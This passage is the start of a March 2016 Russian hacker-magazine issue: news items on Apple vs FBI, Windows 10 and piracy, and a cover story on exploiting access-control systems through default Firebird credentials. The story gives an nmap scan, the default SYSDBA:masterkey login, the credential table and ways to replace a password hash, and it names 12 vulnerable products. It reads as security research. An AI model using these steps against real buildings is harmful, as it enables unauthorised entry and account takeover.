                                                            МАРТ 2016


              №206





                                                     Android на PC:
                                               тестим целый
                                                зоопарк
                                               эмуляторов
                                             Андроида
                                              для десктопа
Как эксплуатировать
ошибки СКУД
                                              Продвинутыев организациях                                           XSS через
и как от этого защититься                                                  BeEF: рулим
                                             пуломCover                                              зараженныхStory                                                 клиентов


                                              Учимся у APT:
                                            перенимаем
                                               секреты
                                                мастерства
                                                     у создателей
                                              мегамалвари
                                             март 2016
          № 206





  MEGANEWS
Всё новое за последний месяц

  Безопасность в опасности
Эксплуатируем примитивные ошибки СКУД

  Пять лет в «Опере»
Илья Шпаньков о прошлом Opera и будущем Vivaldi

  Шифрование и скорость
Сравнительный тест средств шифрования диска

  Ящеры, культисты и пройдохи
Кто и зачем делает альтернативные браузеры

 WWW2
Интересные веб-сервисы

  Карманный софт
Выпуск #17. Домашний экран

  Свидание с Siri
Разбираемся с командами Siri и учим ее новым

  Защищай и властвуй
Обзор VPN-сервисов для Android

  Из кармана в десктоп
Большой тест эмуляторов Android для ПК

  Из Китая с любовью
Выбираем бюджетный смартфон правильно

  Теракт, Apple, FBI, пиар и совесть
Колонка Евгения Зобнина

  Easy Hack
Хакерские секреты простых вещей

  Обзор эксплоитов
Анализ свежих уязвимостей

  Погружение в крипту. Часть 2: распределение ключей
Почему это так важно и как выбрать криптостойкий ключ

  Ошибки пентестера, ужасные и не очень
Колонка Юрия Гольцева

  Зомби-скриптинг
Используем BeEF для продвинутых XSS-атак

  Рынок безопасности
Колонка Александра Полякова

  X-TOOLS
Софт для взлома и анализа безопасности

  Вредоносный маркетинг
Колонка Дениса Макрушина

  Практикум кодера-исследователя: ковыряем Android-малварь
Изучаем вредоносное приложение на примере WhatsApp

  Открытые ключи для серьезных пацанов
Осваиваем Public Key Cryptography на практике

  10 советов на 10 миллионов
Заработок в магазинах приложений: опыт десяти миллионов установок

  Лучшие библиотеки для Material Design
Самый полный обзор полезностей для Android-разработчиков

  Учимся у создателей APT
Чем Taidoor, IXESHE и СozyDuke могут помочь мирному программисту?

  Улыбайтесь, вас снимает Android
Создаем сервис для скрытой съемки на современном Android API

  Тур по BSD
NetBSD, rump-ядра и pkgsrc

  Разговариваем с Linux
Современные системы распознавания речи в Linux

  Видимость нуль, идем по приборам
Система управления виртуализацией Archipel

  Пакуем окна
Изучаем технологию контейнеров MS

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал
                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru





БИТВА ТИТАНОВ
           ротивостояние, от исхода которого зависит очень и очень многое,
          развернулось между компанией Apple и американскими спецслуж-
         бами (при поддержке со стороны правительства США). Данный слу-
          чай действительно обещает стать переломной точкой давнего спо-
          ра правительства и индустрии.
    Развитие ситуации было спровоцировано событиями 2 декабря 2015 года.П
 В 11 часов утра в здание центра для людей с ограниченными возможностями
 города Сан-Бернардино ворвались Сайед Ризван Фарук и Ташфин Малик и
 открыли стрельбу по безоружным, убив четырнадцать человек и ранив больше
 двадцати. Спустя четыре часа сотрудники полиции обнаружили подозревае-
 мых и в перестрелке убили обоих. В ходе расследования был найден iPhone 5c
 одного из нападавших.
   16 февраля 2016 года калифорнийский суд обязал Apple оказать ФБР со-
действие в расследовании. От компании потребовали разблокировать iPhone
5c террориста Сеида Фарука, до этого неудачно заблокированный действиями
самой полиции. Однако Apple отказалась исполнить предписание суда. Более
того, Тим Кук обратился ко всем пользователям с открытым письмом, объяснив
позицию компании и важность данной ситуации для всей индустрии в целом.
  После ноябрьских терактов в Париже правительство США громче, чем пре-
жде, заговорило, что end-to-end шифрование — это плохо, а компании сто-
ит обязать оснащать свою продукцию бэкдорами для спецслужб. Компания
Apple давно выступает категорически против такой политики и известна тем,
что с гордостью заявляет: вскрыть шифрование устройств Apple и получить
доступ к данным пользователей не могут даже сами специалисты Apple. Рас-
следование стрельбы в Сан-Бернардино, которая унесла жизни шестнадцати
человек и в итоге была признана терактом, стало для властей идеальной воз-
можностью надавить на Apple и заставить компанию наконец прогнуться.
   Открытое письмо главы Apple Тима Кука, а также прямой отказ компании ис-
полнять предписание суда и содействовать ФБР во взломе iPhone террори-
ста, спровоцировали в сети настоящий информационный шторм. Эдвард Сно-
уден назвал сложившуюся ситуацию «самым важным технологическим делом
десятилетия». Представители индустрии в основном выступили на стороне
компании Apple: практически сразу позицию Apple поддержал глава Google Сун-
дар Пичаи, а основатель компании McAfee Джон Макафи вообще пообещал вла-
стям взломать этот злосчастный iPhone 5c, не создавая никаких бэкдоров. Руко-
водитель Twitter Джек Дорси написал, что его компания разделяет позицию Тима
Кука и Apple, а Facebook выпустила официальное заявление, которое гласит: «Мы
продолжим агрессивно сопротивляться требованиям, согласно которым компа-
нии должны ослабить безопасность собственных систем. Данные требования
могут создать страшный прецедент». В поддержку Apple высказался также и Па-
вел Дуров во время своего выступления на Mobile World Congress 2016.
   Есть разные мнения на счет того, идет ли в действительности речь о созда-
нии системы с бэкдором. Согласно копии оригинального ордера ФБР, нужен
подписанный цифровым ключом Apple образ со специальным RAM-диском,
который, загруженный на смартфоне через режим DFU, сделает следующее:
   • отключит функцию сброса до заводских настроек после десяти неудач-
    ных попыток ввода PIN-кода;
   • отключит задержку между попытками ввода PIN-кода;
   • позволит пытаться ввести PIN-код программно, используя подключение
    по USB, Wi-Fi или Bluetooth.

И, хоть в ордере есть прямое указание, что образ должен работать только на
конкретном смартфоне, Apple считает, что создание такого образа равносиль-
но созданию уязвимой системы. Попади он в руки посторонним, и о защите
можно забыть.
   Эту точку зрения разделяют не все: на стороне ФБР выступил Билл Гейтс.
«Никто не говорил о бэкдоре. В данном случае государство запрашивает до-
ступ к информации. Они не просят о каком-либо общем решении, они просят
в данном конкретном случае, — объяснил Гейтс в интервью изданию Financial
Times. — Все равно что запрашивать данные у телефонной компании».
   Apple и все, кто высказался в ее поддержку, считают, что постановление
суда о необходимости подобной разработки создаст опасный прецедент:
ФБР сможет и дальше обязывать компании модифицировать свои продукты.
Хуже того: если с таким требованием могут обратиться американские власти,
то и в других странах тоже наверняка заинтересуются открывшейся возмож-
ностью.
   29 февраля 2016 года на сторону Apple встал нью-йоркский суд: судья
Джеймс Оренштейн постановил, что компания не обязана помогать право-
охранительным органам разблокировать другой iPhone, фигурирующий в по-
хожем деле, так как счел запрос спецслужб неконституционным. Поскольку
в Америке действует прецедентное право, нью-йоркский суд, вероятно, помог
фирме Apple в ее противостоянии, но с точки зрения закона мелкие нюансы
могут сыграть решающую роль.



                    «Государство не может окончательно
                   победить преступность, коррупцию или
                   анонимность в сети. Перед ним сто-
                     ит другая задача — низвести все это до
                  минимально возможного уровня. Никто
                    никогда не победит интернет-пиратов.
                  Вопрос в том, 90 или 10 процентов поль-
                    зователей скачивают нелегальные филь-
                   мы. То же самое можно сказать и про Tor
                   с шифрованными мессенджерами».


                                                        Советник президента РФ по интернету Герман Клименко
                                                                               в интервью «Ленте.ру»
СВЕТ В КОНЦЕ
ТОННЕЛЯ

        омпания Microsoft в феврале направила маркетинговые усилия на ис-
        правление ситуации с Windows 10, заявив следующее: «Понаблюдав
         за реакцией, которую вызывал уровень раскрытия подробностей о
        содержимом обновлений для Windows 10, мы решили запустить но-
        вую систему, связывающую обновления и операционную систему. Се-
 годня мы запускаем новый сайт, который содержит историю обновлений дляК
 Windows 10. В этом центре будет сосредоточена информация о каждом об-
 новлении, и он будет служить исторической справкой обо всех вышедших ап-
  дейтах».
   В Microsoft создали специальную страницу, на которой можно увидеть исто-
 рию обновлений и их подробный состав. Первые попавшие в список апдейты
 датированы 9 февраля 2016 года.
   Также в начале месяца в Windows 10 независимыми экспертами были обна-
ружены необычные файлы, предположительно имеющими отношение к Project
Astoria — мосту между Windows и Android. Эту технологию анонсировали
в апреле 2015 года. С ее помощью предполагалось беспрепятственно запу-
скать на смартфонах и планшетах под управлением Windows 10 Mobile прило-
жения для Android . Загадка решилась в конце месяца, когда в Microsoft про-
яснили ситуацию. По заявлению представителей компании, планов развития
проекта нет. Project Astoria был закрыт в пользу двух других интеграционных
решений: проекта Windows Bridge (он же Project Islandwood), работающего в
связке с iOS, и свежеприобретенного стартапа Xamarin, выпускающего фрей-
мворк для кросс-платформенной разработки под iOS, Android и Windows.
  И ещё одна новость о Windows 10, на этот раз точно печальная. Как выяс-
нили исследователи, Windows 10 еще опаснее, чем казалось. Даже когда все
функции мониторинга «выключены», Windows 10 выходит на связь более 5500
раз в день, устанавливая соединение с 113 разными IP-адресами. Около 4000
соединений и 51 IP-адрес из списка относятся к серверам Microsoft. Все со-
единения Windows с серверами Microsoft осуществляются через HTTPS, поэ-
тому характер передаваемой информации определить невозможно. Стоит от-
метить, правда, что такое огромное количество попыток соединения вызвано
именно отключением доступа к серверам, из-за чего система пытается пере-
дать информацию снова и снова. Впрочем, это тоже свидетельство не в поль-
зу Windows 10.
  Подлили масла в огонь и исследователи из компании FireEye, которые
смогли использовать против самого себя тулкит EMET (Enhanced Mitigation
Experience Toolkit). Он должен защищать пользователей Windows от малвари
и эксплуатации багов, но на деле выяснилось, что с его помощью можно пол-
ностью отключить защиту системы. Исследователи отметили, что их метод
значительно проще использовать, чем другие способы обхода или отключе-
ния EMET. Последние патчи, выпущенные Microsoft, вроде бы исправляют эту
уязвимость. Во всяком случае, подтверждения или опровержения от команды
FireEye еще не поступало.
 2 000         $23 000
                             Предлагают хакеры000 000                               сотрудникам Apple     Вредоносных
 приложений для Android
установили пользователи              Сотрудники европейской
                                             штаб-квартиры Apple, пожелавшие
    Исследователи из компании                  остаться неизвестными, рассказали
 Proofpoint подсчитали, что мобильной            изданию BusinessInsider, что служа-
 малвари становится всё больше. Экс-           щих компании регулярно пытаются
 перты нашли в различных магазинах              подкупить хакеры. «Вы удивитесь,
 приложений более 12 000 программ               узнав, сколько людей умудряется до-
 для Android, похищающих данные,                браться до нас – рядовых сотрудников
 устанавливающих бэкдоры или иным               Apple, — рассказал аноним. — Нам
 образом вредящих зараженному                 постоянно приходят письма, в которых
 устройству. Суммарно пользователи            нам предлагают десятки тысяч евро за
 скачали и установили разную малварь             пароль, с помощью которого можно
 более 2 миллиардов раз. Также ком-              проникнуть в Apple». Другой сотруд-
 пания отмечает, что различными вре-             ник добавил, что он мог бы продать
 доносными приложениями пользуются            учетные данные своего Apple ID за $23
 порядка 40% фирм из числа ее клиен-           000 завтра же, хакеры действительно
 тов, работающих с устройствами Apple.           готовы заплатить такую сумму за вну-
 При этом вредоносы поражают не               тренний доступ.
 только джейлбрейкнутые устройства.
RASPBERRY PI 3
ПОСТУПИЛ В ПРОДАЖУ

           aspberry Pi Foundation отмечает четвертый день рождения своего
          одноплатного ПК. В честь этой даты компания выпустила третью
         версию Raspberry Pi. Руководитель проекта Эбен Аптон с гордостью
          пообещал, что цена миникомпьютера не изменится и по-прежнему
          будет составлять всего порядка $35.
    Новая модель микрокомпьютера получила, пожалуй, важнейшее обнов-R
 ление за все время существования проекта: теперь в ней присутствует под-
 держка Wi-Fi (802.11n) и Bluetooth (4.1). Также в Raspberry Pi 3 установлен более
 мощный процессор — четырехъядерный 64-битный ARM Cortex-A53, который
 работает на тактовой частоте 1,2 ГГц. Сообщается, что в результате компьютер
 будет работать на 50% быстрее. Остальные характеристики не изменились:
 все тот же 1 Гб памяти, 4 порта USB, сорокаштырьковый GPIO, HDMI, microSD,
 3,5-мм аудиоразъем и так далее.

ДАТА СМЕРТИ IPHONE

         ата 1 января 1970 года — непростая: это так называемое UNIX-время
         (или POSIX-время), которое является исходной точкой отсчета вре-
       мени в UNIX и POSIX-совместимых ОС. Вероятно, именно поэтому
        изменение системного времени на эту дату создавало в iOS исклю-Дчительную ситуацию, которая не была заложена в работу системы
и мешала нормальному функционированию — вплоть до того, что не давала
включить устройство.
   Неприятный баг, который превращал устройства Apple в кучу неработаю-
щего железа, успел «убить» немало гаджетов с момента своего обнаружения
12 февраля. Компания Apple признала проблему и быстро выпустила обновле-
ние, которое, по счастью, возвращает устройства к жизни.
ОПЕРАЦИОНКА-
ТРАНСФОРМЕР
          нтересное решение предложили пользователям разработчики ка-
          стомной Android-прошивки под названием Maru OS. Новинка совме-
          щает в себе Android 5.1 (Lollipop) и Debian Linux, позволяя превратить
          смартфон в полноценный десктоп, работающий на базе Debian.
           В нормальном режиме смартфон будет работать как обычное
 устройство под управлением Android. Если же подключить гаджет к монито-И
  ру, устройство автоматически распознает подключение и запустит Debian.
 Разработчики обещают, что переключение между ОС займет менее пяти се-
  кунд, причем системы функционируют раздельно: смартфон может отвечать
 на звонки, а состояние десктоп-сессии сохранится в фоновом режиме, если
 вдруг по какой-то причине монитор придется отключить.
 ДНЕВНОЙ ДОЗОР,
 НОЧНОЙ ДОЗОР,
 РОСКОМНАДЗОР
             февраля советник президента РФ по интернету Герман Клименко
               ответил на вопросы издания «Лента.ру» о борьбе с пиратством и
               трекерами, криптовалютах и end-to-end шифровании. Клименко
              подтвердил общеизвестный, но весьма прискорбный факт: наше
              правительство и интернет до сих пор живут в разных плоскостях,
  и к существованию сети чиновники до сих пор не привыкли. «Средний чинов-10
  ник в этом плане если и не безграмотен, то не очень понимает, в чем суть ра-
  боты интернет-отрасли. Поэтому у нас регулярно рождаются странные зако-
нодательные инициативы, связанные с интернетом. И я искренне надеюсь, что
нам удастся решить этот вопрос года за три-четыре», — успокоил Клименко.
  Вопросы о Telegram в частности и защищенных мессенджерах в целом
преследуют советника президента везде. Само право на частную переписку
Клименко не оспаривает, однако он уверен, что разработчики защищенных
средств связи всё-таки должны сотрудничать с правоохранительными орга-
нами: «Действующие сегодня законы возникли не из воздуха. У современной
государственной системы давняя история, и правовые аспекты тоже развива-
лись со временем. Многое из того, о чем мы спорим сегодня, — право доступа
к переписке, проведение обысков, вторжение в частную жизнь, — обсужда-
лось еще в Римской империи».
   Говоря о вопросах шифрования, Клименко пояснил, что запрещать его
(пока) никто не собирается, но государство определенно заметило данную
«проблему» и стало о ней задумываться. Говоря о Tor и других средствах шиф-
рования, советник высказал позицию, которую кратко можно обозначить как
«с глаз долой — из сердца вон». Если нельзя устранить проблему, ее можно
убрать на задний план и минимизировать: «Государство не может окончатель-
но победить преступность, коррупцию или анонимность в сети. Перед ним
стоит другая задача — низвести все это до минимально возможного уровня.
Никто никогда не победит интернет-пиратов. Вопрос в том, 90 или 10 процен-
тов пользователей скачивают нелегальные фильмы. То же самое можно ска-
зать и про Tor».
   Затронула беседа и тему криптовалют, которые базируются на технологии
blockchain. Советник президента пояснил, что пока что «государства осторож-
ничают — ведь никто не может просчитать последствия внедрения blockchain.
Я думаю, с технологией сейчас будут много экспериментировать и пробовать
применить ее в разных сферах экономики. Например, в биржевой торговле.
Хотя сразу ввести blockchain — это перейти в принципиально другую реаль-
ность. И я даже не говорю про банковскую систему или финансы. Речь о по-
ведении людей. Когда у каждого условного рубля появится своя меточка, то
будет даже непонятно, чем дать взятку. Только представьте себе такое!»
  Отношение к пиратам у официального государственного ведомства, Ро-
скомнадзора, пока что действительно довольно мягкое. Хотя в декабре-январе
аудитория Рунета и наблюдала серьезную по накалу борьбу правообладате-
лей с торрент-трекером RuTracker (закончившуюся блокировкой последнего),
но к различным анонимайзерам и прочим средствам обхода блокировок, по-
зволяющим беспрепятственно посещать «заблокированный» RuTracker и дру-
гие сайты, Роскомнадзор относится спокойно. В эфире телеканала «Россия
24» пресс-секретарь ведомства Вадим Ампелонский заявил: «Я считаю, что
смысла блокировать их нет. Во-первых, эти средства анонимизации и шиф-
рования трафика имеют широкую сферу полезного применения. Во-вторых,
несложно создать на замену заблокированным программам новые. Это будет
бесконечная гонка, игра в прятки, в которую мы как государственный орган
ввязываться не хотим».
   Вместо серьезных технологий, таких как Tor и blockchain, ведомство пока
что задумалось о более открытых и доступных: например, о регуляции онлай-
новых игр. На эту напасть Роскомнадзор обратил внимание после парижских
террористических атак: «В Париже террористы организовывали свои комму-
никации не только посредством шифрованных мессенджеров, но и, насколько
я знаю, через PlayStation 4, где невозможно определить, относятся ли призывы
стрелять и убивать к событиям виртуальной игры или реальной террористиче-
ской атаки», — заявил глава Роскомнадзора Александр Жаров. Позже оказа-
лось, что журналисты ошиблись: о том, что террористы использовали PS4, со-
общало издание Forbes, ссылаясь на слова министра внутренних дел Бельгии
Жана Жамбона, который, как оказалось, не связывал проблемы приставок с
терактами. Однако потенциальная опасность такого рода уже пробудила ин-
терес Роскомнадзора.



 «Я считаю, что нас заблокировали не для того, чтобы нака-
 зать виновных, а чтобы ограничить как конкурентов. Если в
 ближайшее время будет принят закон, запрещающий обход
 блокировок, тогда я изменю свое мнение — это правда бу-
 дет похоже на тотальную зачистку российского интернета.
 Если не примут, то наша блокировка — это бизнес. Среди
 наших конкурентов — те же владельцы онлайн-кинотеатров.
 Например, сервисы Megogo.net, Ivi.ru. То есть те, кто предо-
 ставляет доступ к материалам, но покрыт рекламой сверху
 донизу. Мы тоже показываем рекламу, но не встраиваем ее в
 произведения».


                                                          Администратор RuTracker, представившийся Сергеем,
                                                                       в интервью изданию «Медуза»
44 РОНИНА
           сем, кто полагает, что российские меры по борьбе с пиратством —
           это «слишком», стоит обратить внимание на происходящее в Япо-
           нии. В период с 16 по 18 февраля в 29 префектурах Японии прошли
         массовые задержания сетевых пиратов. Суммарно были арестова-
         ны 44 человека, которым теперь грозит тюремный срок до десяти
 лет лишения свободы.В
    Дело в том, что с 2012 года в Стране восходящего солнца преступлени-
 ем считается не только публикация защищенного авторским правом контента
 в сети, но и простое его скачивание. Официальное сообщение полиции гла-
  сит, что все задержанные обвиняются в нелегальном скачивании и распро-
 странении фильмов, музыки, аниме, манги или программного обеспечения.
 Почти все задержанные использовали для загрузки нелегального контента
 P2P-приложения.
     86%                                  Угроз можно нейтрализовать,
                                  отказавшись от админских
                                       прав в Windows
     Новых доменов100+                                              Специалисты компании Avecto   приготовил RuTracker                                             представили ежегодный отчет об
                                              уязвимостях в продуктах компании
    RuTracker уже получил две пожиз-                                                       Microsoft. Новое исследование пока-
 ненных блокировки, но ситуация во-                                                  зало, что банальное отключение прав
 круг ресурса по-прежнему остается                                            администратора в Windows позволит
 неспокойной. Правообладатели все-                                             избежать большинства проблем. Так,
 рьез размышляют о возможности раз-                                             если админские права отключены,
 делегирования домена rutracker.org, а                                      82% багов Microsoft Office станут не-
 также о последующей блокировке всех                                              актуальными; 82% уязвимостей, най-
 зеркал сайта. Хотя пока Мосгорсуд от-                                            денных в Windows 10, перестанут быть
 казался блокировать зеркала трекера,                                               таковыми; бесполезными окажутся
 заявив, что это создало бы «правовую                                            99,5% угроз для Internet Explorer;
 неопределенность», администрация                                              а также вообще перестанут работать
 ресурса сообщает, что готова и к та-                                      85% уязвимостей, открывающих воз-
 кому повороту событий. «Мы подго-                                            можность удаленного исполнения про-
 товили более 100 зеркал в доменных                                               извольного кода. В целом отключение
 зонах различных юрисдикций и наиме-                                             прав администратора сделает невоз-
 нований», — сообщили представители                                         можной эксплуатацию 63% всех багов
 администрации трекера изданию «Из-                                             продукции Microsoft.
 вестия».
У ВАС ЭЛЕКТРОНЫ
ПРОСАЧИВАЮТСЯ!

       ще в 2014 году была разработана техника перехвата криптографиче-
         ских ключей путем измерения электрического потенциала на корпусе
         ноутбука во время расшифровки. В 2015 году та же группа исследо-
         вателей усовершенствовала свою методику: теперь атака позволяет
         извлечь криптографический ключ, анализируя паттерн использова-
 ния памяти или электромагнитного сигнала, который компьютер излучает воЕ
 время работы. Иметь доступ к корпусу ноутбука больше не обязательно.
    Сначала исследователи направили на ноутбук специальный шифротекст,
 а  когда машина принялась его обрабатывать, замерили «просачивание»
 электромагнитных волн (electromagnetic leakage). Это действие потребова-
 лось повторить 66 раз, но каждая итерация заняла всего около 0,05 сек. — то
 есть на все 66 ушло 3,3 секунды.
   С подробным докладом группа выступила на конференции RSA 3 марта
 2016 года.
ЧТО ПРОИСХОДИТ
С ЛИЧНЫМИ ДАННЫМИ
ПОСЛЕ ВЗЛОМА:
ЭКСПЕРИМЕНТ
КОМПАНИИ BITGLASS

           сследователи компании Bitglass провели интересный эксперимент:
          они создали сайт вымышленного банка, снабдили его несуще-
          ствующих служащих фейковыми личностями, подключили аккаунт
           Google Drive, добавили ко всему этому информацию о настоящих
           банковских картах, слили эти сфабрикованные данные в даркнет
 под видом результата фишинговой атаки и принялись ждать.И
   Спустя 48 часов уже можно было наблюдать сотни просмотров аккаунтов
и скачиваний файлов, а за месяц компания зафиксировала более 1400 попы-
ток использования фальшивых данных хакерами из 30 разных стран.
Интересные факты, которые помог выявить данный эксперимент:

• 94% хакеров получили доступ к аккаунтам GoogleDrive фальшивых жертв;
• 36% хакеров в итоге сумели получить доступ к их «личным» банковским ак-
  каунтам;
• 68% трафика, сгенерированного хакерами, проходило через Tor;
• 35% хакеров (из тех, кто не использовал Tor) имели российские IP-адреса.





   50%                   48%
      американцев                            жертв
      заплатили                               из Румынии
      хакерам выкуп                           поступили
                                                  так же





         ...и 44%                         Меньше всех готовы платить
      из Британии                         злоумышленникам датчане:
                           14% опрошенных

COVER STORY
БЕЗОПАСНОСТЬ
В ОПАСНОСТИ
ЭКСПЛУАТИРУЕМ
ПРИМИТИВНЫЕ
ОШИБКИ СКУД





                                                                               Евгений Соболев
                                                                                                           sobolev@itpsl.ru
                                                                                                                Practical Security Lab
Довольно часто мы ведемся на красивые маркетинговые
фразы многих продуктов, такие как «Ваш компьютер за-
щищен» или «Ваша система в безопасности». Мы доволь-
но расслабляемся и думаем, что нам ничего не грозит. Но,
оказывается, security-решения сами нуждаются в защите.
Считаешь, та легкость, с которой злоумышленники в кино
открывают любые двери — всего лишь красивая режис-
серская выдумка? Ну что ж, давай выясним!


А для этого мы сегодня «пригласили на серьезный разговор» системы кон-
троля и управления доступом (СКУД), которые как раз и отвечают за открытие
дверей только нужным людям.

ПРЕАМБУЛА
При изучении безопасности различных объектов и ПО часто обнаруживаются
уязвимости, возникающие просто от халатности или невнимательности. На-
пример, когда на сервере не патчится / не отключается служба, про которую
давно известно, что она «дырявая». Или когда после установке CMS-ки не уда-
ляется инсталляционный скрипт. Дефолтные конфиги, дефолтные права тоже
частенько приводят ко взлому систем. Ну и конечно же, встроенные учетки
с логинами и паролями «по умолчанию». Все это при анализе защищенности
очередной системы периодически попадается и мне.
  Во время одного такого исследования, например, сканер сети обна-
ружил открытый 3050/tcp, на котором обычно висит СУБД FireBird; а ког-
да я попробовал подключиться к нему и войти под дефолтной учеткой
SYSDBA:masterkey, никто мне не воспрепятствовал сделать это. Как потом
оказалось, на сервере вертелась база системы контроля и управления до-
ступом (в моей практике также встречались случаи, когда «огненная птич-
ка» использовалась разным бухгалтерским ПО или ДБО системами). Имея
доступ к такой базе, ты имеешь доступ к учеткам (логинам, паролям) всех
пользователей, включая администраторов системы. Подсмотрев их, мож-
но так же легко подключиться к системе через красивый GUI официального
клиента. Почему легко? Потому что зачастую пароли хранятся в открытом
виде. Если они хранятся в зашифрованном виде — то ничто не мешает уз-
нать алгоритм шифрования, имея на руках экземпляр ПО, и расшифровать
их. Использование хешей также не проблема, их можно сбрутить, или же
подменить хеш к базе на нужный.
  И тогда мне стало интересно: а много ли СКУДов подвержены такой
уязвимости?
  Было решено отобрать самых популярных представителей, протестиро-
вать их и посмотреть, что можно «выжать» из данной уязвимости с точки зре-
ния злоумышленника. Давайте перейдем к исследованию.

ПОДХОД К ИССЛЕДОВАНИЮ
Для начала я скачал с официальных сайтов производителей демо-версии или
обычные версии ПО, в зависимости от того, что было доступно. Если возмож-
ности скачать дистрибутив с сайта не было, то я связывался с производителем
по email и просил предоставить демо или триал версию для тестирования или
сравнительного анализа. Собрав наиболее распространенные дистрибутивы,
я приступил к тестированию.
  Каждая СКУД устанавливалась на виртуальную машину и анализирова-
лась на предмет открытых портов. Если среди прочих появлялся 3050/tcp
порт, то я пробовал зайти на сервис, слушающий его, под дефолтным ло-
гином и паролем. Если залогиниться под стандартной учеткой не получа-
лось, то есть программа при установке Firebird-сервера сменила пароль, то
я пытался понять, на какой именно. Пробовал устанавливать ПО несколь-
ко раз и смотрел, изменялся ли хеш пароля от FB-сервера или нет. Если
он не менялся, то есть при нескольких установках оставался одним и тем
же, я предполагал, что пароль является универсальным для всех установок
конкретного ПО. Это не лучше, чем использование общеизвестных учетных
данных по умолчанию. Любой, кто установит себе такое решение, легко мо-
жет узнать хеш от всех остальных клиентов, что не есть правильный и без-
опасный вариант.
  После этого я откатывал виртуальную машину назад в первоначальное со-
стояние и переходил к следующему образцу. Если программа не устанавли-
валась на Windows XP, те же действия повторялись в Windows 7. Все проверки
проводились для ситуации, когда СКУД находится в локальной сети и установ-
лена с параметрами по умолчанию. Уязвимым я считал ту СКУД, к СУБД кото-
рой удалось подключиться и увидеть внутренности базы.

РЕЗУЛЬТАТЫ ИССЛЕДОВАНИЯ
После завершения всех манипуляций я получил следующие результаты:
1. Двенадцать из двадцати пяти СКУД-решений имели такой недостаток. Это
  APACS 3000, ENT Контроль, KODOS, LyriX, Сфинкс, Castle, Elsys BASTION,
  Tempo Reale, АВАНГАРД, КРОНВЕРК Реверс, Стражъ, Электра-АС.
2. В остальных протестированных СКУД такой особенности, к счастью,
   не было выявлено. Это Шэлт ПРО, БИТ, Gate, Golden Gate 2002, ParsecNET,
   Perco, QUEST  II, RusGuard, Smartec-Timex, Biosmart, ITV-Интеллект, Бо-
  лид-ОРИОН ПРО, Сторк.
Уязвимость не всегда опасна

Стоит отметить, что не всегда возможность подключиться к СУБД и получить
доступ к базе представляет большой риск для СКУД. Если подобные уязвимые
системы используются, например, на подземной парковке жилого дома/ком-
плекса, где на КПП сидит пара охранников, то риска здесь почти никакого нет,
так как для того, чтобы воспользоваться данной уязвимостью, нужно иметь
доступ в локальную сеть, где находится компьютер с сервером СКУД. В слу-
чае с парковкой просто некому воспользоваться таким недостатком, кроме
как самим охранникам, которые и без этого имеют санкционированный доступ
к системе. Другое дело — случаи, когда речь идет о большом офисе или орга-
низации, где есть непривилегированные пользователи и помещения, куда хо-
дить без разрешения нельзя, то есть когда мы говорим о заводах, госорганах,
средних и крупных компаниях и так далее.



ЭКСПЛУАТАЦИЯ
Около половины (12 из 25) рассмотренных систем оказались подвержены
данной уязвимости, а это означает, что шанс встретить в реальной жизни
СКУД-сервер с открытым 3050-м портом достаточно велик. Поэтому давай
посмотрим, что можно сделать, если вдруг ты обнаружил в своей локальной
сети такую машину.

НАЙТИ FIREBIRD
Первое, с чего следует начать, и что будет делать злоумышленник, — это
искать во внутренней сети компании открытый 3050/tcp порт. Для этого
можно воспользоваться легендарным сканером nmap, запустив его с таки-
ми ключами:

nmap -sS -p3050 --open 192.168.0.0/24

В результате сканирования nmap выведет список хостов из сети 192.168.0.
0/24, на которых открыт tcp порт 3050 (результат сканирования представлен
на рисунке 1).
Рис. 1. Поиск в сети Firebird


Соответственно, адресация сети у каждого будет своя, но принцип поиска
один и тот же.

ПОДКЛЮЧИТЬСЯ К FIREBIRD
Обнаружив в сети машинy (или машины) с установленным сервером Firebird,
попробуем к ним подключиться. Сделать это можно с помощью програм-
мы IBExpert. Забегая вперед, скажу, что для ее работы с «огненной птич-
кой» понадобится библиотека fbclient.dll (чтобы ее получить, установи
Firebird-сервер на свою машину или скачай из Интернета). После установ-
ки пробуем подключиться к каждому найденному серверу. Для подключения
потребуется знать логин, пароль и путь к БД на самом сервере. Логин и па-
роль будем использовать дефолтные (SYSDBA:masterkey), а путь к БД, скорее
всего, с очень высокой долей вероятности окажется стандартным (пути к БД
различных СКУД представлены на рисунке 2). Правда, так как в тестировании
участвовали демо-версии, то не все пути на рисунке 2 будут соответство-
вать расположению баз в полноценных версиях. В любом случае, практиче-
ски всегда есть вариант установить себе интересующую СКУД и посмотреть,
какой она использует путь по умолчанию. Узнать название СКУД достаточно
просто: можно спросить прямо, какая используется СКУД, можно попросить
совета у безопасника: «Какая СКУД лучше?», и он сам все расскажет. Можно
подсмотреть иконку или очертания интерфейса на мониторе на КПП. Иногда
на считывателях карт есть значок производителя ПО. А можно просто пере-
брать все стандартные варианты, их немного.
Рис. 2. Примеры путей к файлам баз данных для различных СКУД





Рис. 3. Подключение к БД

РАЗОБРАТЬСЯ В СТРУКТУРЕ БД
Итак, мы подключились к БД напрямую и теоретически можем делать все, что
хотим — даже то, что не позволяет сделать официальный интерфейс адми-
нистрирования. Но чтобы взаимодействовать со СКУД через FB-сервер, нуж-
но разобраться в формате БД, а сколько СКУД, столько и разных форматов
хранения информации в базе данных. Поэтому, чтобы избежать абстрактно-
го разговора, все дальнейшие действия мы будем рассматривать на примере
СКУД ENT Контроль. В других системах будет практически все то же самое.





Рис. 4. Структура БД

Прежде всего для подключения к серверу СКУД нам понадобится клиентская
программа под конкретную версию. Еще нужно знать IP, логин, пароль. IP мы
уже нашли с помощью сканера портов, а вот логин и пароль от интерфейса
СКУД нам не известны, но их можно узнать из БД. В таблице FB_UZP хранятся
данные для авторизации пользователей управления СКУД (см. рисунок 5).





Рис. 5. Учетные записи СКУД в БД

Логин хранится в открытом виде, а пароль — в виде хеша (md5). Тут мы можем
поступить разными способами:
1. сбрутить хеши и узнать пароли (привет cmd5.ru);
2. заменить хеш нужного пользователя на известный нам, например, c4ca423
   8a0b923820dcc509a6f75849b, что соответствует паролю 1;
3. создать нового пользователя со своим паролем/хешем.





Рис. 6. Брут хешей online

Выбор за тобой, только после всех этих действий не забудь сделать Commit,
чтобы все изменения были сохранены.


                                                                  Рис. 7.
                                                        Делаем
                                                          Commit





Теперь подключаемся к серверу с помощью официального клиента.


                                                                  Рис. 8.
                                                              Авторизуемся
И получаем доступ к панели администрирования СКУД как легальный админ.

                                                                 Рис. 9.
                                                            Залогинились





Конечно, работая с БД напрямую, можно делать намного больше, чем через
GUI. Зато интерфейс позволяет удобней и быстрей выполнять официально
разрешенные действия.

